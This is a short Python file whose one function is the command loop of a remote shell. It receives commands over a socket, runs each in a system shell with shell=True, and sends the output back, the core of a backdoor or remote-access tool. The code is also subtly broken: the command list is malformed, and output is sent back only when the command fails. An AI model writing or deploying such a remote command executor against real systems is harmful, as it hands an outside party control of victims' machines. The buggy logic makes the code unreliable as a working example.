import subprocess

def exec_command(mysocket):
    print("[+] executing command")

    while True:
        user_command=mysocket.received_data()
        print(user_command)
        if user_command=="stop":
            break

        output=subprocess.run(["Terminal",user_command],shell=True,capture_output=True)
        if output.stderr.decode("utf-8")=="":
            comand_result=output.stdout.decode("utf-8")
        else:
            comand_result=output.stderr.decode("utf-8")
            mysocket.send_comnd_result(comand_result)
